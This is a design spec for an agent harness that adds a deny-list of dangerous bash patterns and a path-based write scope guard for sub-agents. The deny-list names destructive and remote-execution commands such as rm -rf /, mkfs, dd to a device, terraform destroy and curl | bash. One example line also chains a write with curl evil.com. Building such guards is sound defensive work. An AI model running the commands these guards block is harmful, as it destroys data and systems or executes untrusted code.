# Tool System Rework — "Model Free, Harness Guards"

**Date:** 2026-06-03
**Status:** Approved (pending spec review)
**Scope:** Phase 2 of Graph-Centric agent harness

## 1. Context

The current tool system has two design issues:

1. **Hardcoded capability gating.** `SubTask.needs: TaskNeeds` carries
   `can_read / can_write / can_execute` bools that the SubAgent
   (a) prints into the system prompt as "## Capabilities you've been granted",
   and (b) is meant to use (via `domain::ToolRegistry`) to assemble a
   curated tool set per task. The net effect: **the Harness decides what
   tools the model may use**, not the model.

2. **No execution-time safety nets for the most common damage modes.**
   `BashTool::classify_read_only` is a heuristic. Once a command is
   classified as non-read-only, the `Policy` is binary: `AllowAll` lets
   everything through, `ReadOnly` blocks all writes. There is no
   middle ground where the harness says *"you can write, but not `rm -rf /`"*
   and no scope check that prevents a sub-agent from editing files
   outside the task's `involved_nodes`.

These issues were flagged in the 2026-06-02 deviation analysis comparing
ARCHITECTURE.md against the actual implementation.

## 2. Goal

Realign the tool system with the project's core design philosophy:
**Harness provides mechanism, model decides strategy.** The model gets
the full tool surface; the harness provides two orthogonal guards:

- **Danger guard** — a precise deny-list of high-risk command patterns
- **Scope guard** — write operations limited to files in `task.involved_nodes`

## 3. Non-goals (YAGNI)

- ❌ No `CapabilityRequest` / `ToolAuditor` (the model does not pre-declare
  needs; tools are available by default)
- ❌ No shell AST parser (deny-list is exact-match, not semantic)
- ❌ No regex matcher in v1 (only `Exact` / `Contains` / `Prefix`)
- ❌ No per-domain deny-list override (v1 has a single global list)
- ❌ No change to `domain::ToolRegistry` trait (backwards compatible)
- ❌ No change to `Tool` trait, `ToolDef`, `ToolContext`, or `ToolRegistry` core

## 4. Architecture overview

```
┌────────────────────────────────────────────────────────┐
│                  SubAgent                              │
│                                                        │
│  Default policy:  Arc<DangerousCommandDeny>            │
│  Optional scope:  Option<Arc<ScopeGuard>>              │
│                                                        │
│  build_initial_user_prompt: drops TaskNeeds line       │
└────────────────────────────────────────────────────────┘
                       ↓
┌────────────────────────────────────────────────────────┐
│              ToolRegistry::invoke                      │
│                                                        │
│   ① policy.decide(name, input, is_ro)                  │
│      └─ DangerousCommandDeny: pattern match → Deny     │
│   ② scope_guard.check(name, input)  (if Some)          │
│      └─ write target outside involved_nodes → Deny     │
│   ③ tool.call(input, ctx)                              │
└────────────────────────────────────────────────────────┘
```

The two guards are independent. A sub-agent can run with one, both, or
neither (the last is unsafe and is only the default in tests).

## 5. Component: `DangerousCommandDeny` Policy

### 5.1 File: `src/tools/deny_list.rs` (new)

```rust
pub struct DenialPattern {
    pub name: String,           // human-readable
    pub matcher: DenialMatcher,
}

pub enum DenialMatcher {
    Exact(String),       // whole command equals
    Contains(String),    // substring match
    Prefix(String),      // starts-with
}

pub fn default_dangerous_patterns() -> Vec<DenialPattern>;
```

### 5.2 Built-in patterns (v1)

| Name | Matcher | What it catches |
|---|---|---|
| `rm-rf-root` | `Contains("rm -rf /")` | wipes root filesystem |
| `rm-rf-home-prefix` | `Contains("rm -rf ~")` | wipes home dir |
| `rm-rf-glob-root` | `Contains("rm -rf /*")` | wipe via glob |
| `mkfs` | `Prefix("mkfs")` | format a filesystem |
| `dd-to-device` | `Contains("dd if=")` & contains `of=/dev/` | raw disk write |
| `shutdown` | `Prefix("shutdown")` | halt the system |
| `reboot` | `Prefix("reboot")` | |
| `halt-poweroff` | `Exact("halt")` / `Exact("poweroff")` | |
| `kubectl-delete` | `Contains("kubectl delete")` | k8s resource removal |
| `kubectl-drain` | `Contains("kubectl drain")` | node drain |
| `terraform-destroy` | `Contains("terraform destroy")` | infra teardown |
| `git-push-force` | `Contains("git push --force")` / `Contains("git push -f")` | force-push |
| `git-reset-hard` | `Contains("git reset --hard")` | discard local commits |
| `chmod-777-recursive` | `Contains("chmod -R 777")` | open permissions |
| `pipe-to-shell` | `Contains(" | bash")` / `Contains(" | sh")` | remote-script exec (catches `curl | bash`, `wget \| sh`, etc.) |
| `redirect-disk-device` | `Contains("> /dev/sd")` / `Contains("> /dev/nvme")` | raw disk overwrite |

**v1 uses only `Exact` / `Contains` / `Prefix`.** Compound patterns
that would need AND-of-Contains (e.g. "curl AND pipe-to-bash") are
handled by a single `Contains` that captures the union — for example,
`" | bash"` catches `curl ... | bash`, `wget ... | bash`, and any
other upstream piped to bash. A future `And` matcher variant in
`DenialMatcher` is explicitly out of scope for v1.

### 5.3 Policy struct in `src/tools/mod.rs`

```rust
pub struct DangerousCommandDeny {
    patterns: Vec<DenialPattern>,
}

impl DangerousCommandDeny {
    pub fn new() -> Self;
    pub fn with_pattern(self, name: &str, m: DenialMatcher) -> Self;
    pub fn with_patterns(self, extra: Vec<DenialPattern>) -> Self;
    pub fn without_pattern(self, name: &str) -> Self;
    pub fn pattern_names(&self) -> Vec<String>;  // for tests + introspection
}

impl Policy for DangerousCommandDeny {
    fn decide(&self, tool: &str, input: &Value, _is_ro: bool) -> PolicyDecision {
        if tool != "bash" { return PolicyDecision::Allow; }
        let cmd = input.get("command").and_then(|v| v.as_str()).unwrap_or("");
        for p in &self.patterns {
            if match_denial(&p.matcher, cmd) {
                return PolicyDecision::Deny(format!(
                    "blocked by dangerous-command pattern '{}'", p.name
                ));
            }
        }
        PolicyDecision::Allow
    }
}

fn match_denial(m: &DenialMatcher, cmd: &str) -> bool {
    match m {
        DenialMatcher::Exact(s)   => cmd == s,
        DenialMatcher::Contains(s) => cmd.contains(s),
        DenialMatcher::Prefix(s)   => cmd.starts_with(s),
    }
}
```

`DangerousCommandDeny::new()` is the new default policy for `SubAgent`.

## 6. Component: `ScopeGuard`

### 6.1 File: `src/tools/scope_guard.rs` (new)

```rust
pub struct ScopeGuard {
    allowed_write_paths: Vec<PathBuf>,
    restrict_reads: bool,  // default false
}

pub struct ScopeViolation {
    pub tool: String,
    pub reason: String,
    pub offending_paths: Vec<PathBuf>,
}

impl ScopeGuard {
    /// Derive scope from a set of world-graph nodes.
    /// Walks each node's `path` metadata and the path of every
    /// File / Function / Class / Config / Module node transitively
    /// within distance 1.
    pub fn from_involved_nodes(
        graph: &Graph,
        involved: &[NodeId],
    ) -> Self;

    /// Manually specify allowed write paths.
    pub fn new(allowed_write_paths: Vec<PathBuf>) -> Self;
    pub fn restrict_reads(self, yes: bool) -> Self;

    /// Check whether the (tool, input) is in scope.
    /// Read-only operations: pass.
    /// Write operations: every touched path must lie within
    /// allowed_write_paths.
    pub fn check(&self, tool: &str, input: &Value) -> Result<(), ScopeViolation>;
}
```

### 6.2 Read vs write classification for bash

`ScopeGuard::check` for `tool == "bash"` follows this decision procedure:

1. Parse `input.command` as a string.
2. If `BashTool::classify_read_only(cmd) == true` → return Ok.
3. Otherwise, the command is a candidate write. Detect write intent
   by checking for any of:
   - Write redirection operators: `>`, `>>` (anywhere in the string)
   - Write command verbs: the first whitespace-separated token is in
     `{rm, mv, cp, sed, install, tee, dd, chmod, chown, ln}`
4. Extract file paths from the command via regex matching
   `(?:/[A-Za-z0-9_./-]+)+` (one or more `/`-led segments). Collect
   all matches. Drop matches that resolve to `..` (path-traversal
   attempt).
5. If write intent was detected and at least one path was extracted:
   resolve each to absolute and check it begins with one of
   `allowed_write_paths`. If any path is outside, return
   `ScopeViolation { reason: "path X outside scope", offending_paths }`.
6. If write intent was detected but no path could be extracted
   (e.g. a heredoc redirect to a variable, or a write through a
   variable indirection like `out=$file; echo x > $out`), return
   `ScopeViolation { reason: "write target not extractable; use a literal path" }`.
7. If the command contains any of the SUSPICIOUS operators
   (`||`, `&&`, `;`, `$(`, `` ` ``, `&`) — *combined* with a write
   indicator from step 3 — return `ScopeViolation { reason:
   "command shape too complex to scope-check; split into separate calls" }`.
   (Read-only commands chained with these operators are not affected
   because step 2 already returned Ok for them.)

This is **best-effort, conservative**. A command that *might* be a
write but cannot be conclusively classified is treated as a write.
The model can succeed by being explicit (`cat foo`, `sed -i 's/x/y/' foo`,
`rm foo`) rather than `cat foo && rm bar && curl evil.com > bar`.

### 6.3 Scope for non-bash tools

In v1, only `bash` is scope-checked. Future tools (`EditFile`,
`WriteFile`) take a `path` argument and `ScopeGuard::check` will
resolve that single path against `allowed_write_paths`. The trait
extension is left as a follow-up; the current API supports it
because `check` takes `(tool, input)`.

## 7. SubAgent wiring

### 7.1 Constructor change

```rust
impl SubAgent {
    pub fn new(model: Arc<dyn Model>) -> Self {
        Self {
            // ... existing fields ...
            policy: Arc::new(DangerousCommandDeny::new()),  // was AllowAll
            scope_guard: None,                               // new field
            // ... rest unchanged ...
        }
    }

    pub fn with_scope(mut self, guard: Arc<ScopeGuard>) -> Self {
        self.scope_guard = Some(guard);
        self
    }
}
```

### 7.2 Invoke path change (one new branch)

In `SubAgent::execute`, at the `Action::UseTool` arm:

```rust
// Inside the Action::UseTool arm, before calling self.tools.invoke:
// (the arm sits inside a `for step in 0..self.max_steps` loop, so
// `continue` skips to the next iteration without invoking the tool.)
if let Some(sg) = &self.scope_guard {
    if let Err(v) = sg.check(&tool, &args) {
        let detail = format!(
            "Tool `{}` denied by scope guard: {}. \
             Stay within your allowed write paths.",
            tool, v.reason
        );
        messages.push(Message::user(detail));
        continue;  // do not invoke; feed message back to model next step
    }
}
let tool_msg = match self.tools.invoke(&tool, args, &tool_ctx).await { ... };
```

### 7.3 Prompt change

`build_initial_user_prompt` drops the `## Capabilities you've been granted`
block. If a scope guard is set, append:

```text
## Write scope
Edits and writes are restricted to these paths:
- /abs/path/to/src/auth/
- /abs/path/to/src/utils/hashing.rs
```

The system prompt otherwise stays the same.

### 7.4 Dispatcher change

In `dispatcher.rs`, when spawning a sub-agent, auto-attach a scope guard
derived from the task's `involved_nodes` if the dispatcher was constructed
with `auto_scope: true` (default in v1).

```rust
let scope = Arc::new(ScopeGuard::from_involved_nodes(
    &world_graph,
    &task.involved_nodes,
));
let agent = SubAgent::new(model.clone())
    .with_tools(tools)
    .with_scope(scope);
```

If `auto_scope` is `false`, no scope guard is attached (the caller takes
responsibility for the sub-agent's blast radius).

## 8. TaskNeeds fate

`SubTask.needs: TaskNeeds` is **kept** for backwards compatibility but:

- No longer printed into the system prompt.
- No longer used to gate the tool set.
- Remains as structured metadata (visible in serialized task nodes,
  visible in audit logs, available to future scope/refinement logic).

`SubTask::to_task_node` continues to serialize `needs` to the node's
metadata. `from_task_node` continues to deserialize. Both are unchanged.

## 9. Tests

### 9.1 Unit: `deny_list.rs`

For each default pattern in the built-in library:
- At least 1 positive case (matches → Deny)
- At least 1 negative case (similar but not the dangerous form → Allow)

Plus:
- `with_pattern` adds a custom matcher that fires
- `without_pattern` removes a built-in matcher
- `with_patterns` adds multiple at once
- `pattern_names` returns the expected list
- Policy is `Allow` for non-bash tools regardless of input

### 9.2 Unit: `scope_guard.rs`

- `from_involved_nodes` with File nodes picks up the file paths
- `from_involved_nodes` with Function nodes picks up the file path
  via the node's `path` metadata
- `from_involved_nodes` with non-file nodes (Task) yields empty scope
  (which then denies all writes — documented as a feature)
- `check` on read-only bash command → ok
- `check` on write to in-scope path → ok
- `check` on write to out-of-scope path → Err
- `check` on complex command (nested subshell write) → Err with
  "command shape too complex"
- `restrict_reads(true)` denies out-of-scope reads too

### 9.3 Unit: `subagent.rs`

- `SubAgent::new(model).policy` is `DangerousCommandDeny`, not `AllowAll`
  (the default change is observable).
- `with_scope` attaches a guard; `check` is invoked before `invoke`.
- A model that calls bash with `rm -rf /tmp/x` gets the pattern-match
  deny reason fed back as a `Tool bash denied: blocked by ...` message.
- A model that writes outside its scope gets a scope-violation message.
- A model that calls a tool the scope guard classifies as out-of-scope
  receives feedback and can recover on the next turn (no infinite loop).
- All existing `subagent.rs` tests that explicitly set
  `with_policy(Arc::new(ReadOnly))` or `with_policy(Arc::new(AllowAll))`
  continue to pass — they override the default.

### 9.4 Integration: demo

Re-run `cargo run --bin demo`. The agent's bash usage should be
unaffected for normal operations. A targeted test case that asks the
agent to run `rm -rf /tmp/demo-sentinel` should be denied.

## 10. Migration / rollout

1. Implement `deny_list.rs`, `scope_guard.rs`, add `DangerousCommandDeny`
   to `tools/mod.rs`.
2. Add `with_scope` to `SubAgent`; change default policy.
3. Update `Dispatcher` to attach a `ScopeGuard` per task by default.
4. Drop the `## Capabilities you've been granted` line from the prompt.
5. Run full test suite. Expect all existing tests to pass (the
   `with_policy` overrides preserve their behavior).
6. Run the demo. Verify normal behavior + targeted deny.

If the demo reveals that any built-in pattern is too aggressive
(false positives on legitimate commands), use `without_pattern` to
remove it. Document any removals in a "fine-tuning log" comment in
`deny_list.rs`.

## 11. Open questions for implementation

These are minor and can be decided during coding:

- Exact regex/path-extraction strategy for `ScopeGuard::extract_paths`
  in bash commands. v1 will use a simple `lazy_static!` regex of
  `/[A-Za-z0-9_./-]+`. Reject paths containing `..` after resolution.
- Whether to log deny events at `info!` or `warn!` level.
  Recommendation: `warn!` for both Danger and Scope denials — they
  signal either a misconfigured task or a model trying to escape.
- Whether to expose `policy.pattern_names()` on `DangerousCommandDeny`
  in the SubAgent's debug log. Recommendation: yes, on first construct.

## 12. Acceptance criteria

The spec is done when:

- [ ] `deny_list.rs` and `scope_guard.rs` exist with the listed APIs.
- [ ] `DangerousCommandDeny::new()` blocks all default patterns
      and lets through a representative set of legitimate commands
      (at least 20, covering `ls`/`cat`/`grep`/`git status`/`cargo check`/etc.).
- [ ] `ScopeGuard::from_involved_nodes` correctly derives a set of
      write-allowed paths from a graph with mixed node kinds.
- [ ] `SubAgent::new` defaults to `DangerousCommandDeny`.
- [ ] `with_scope` causes out-of-scope writes to be denied and the
      reason fed back to the model.
- [ ] The system prompt no longer mentions TaskNeeds capabilities.
- [ ] `cargo test` is green; the demo runs end-to-end.
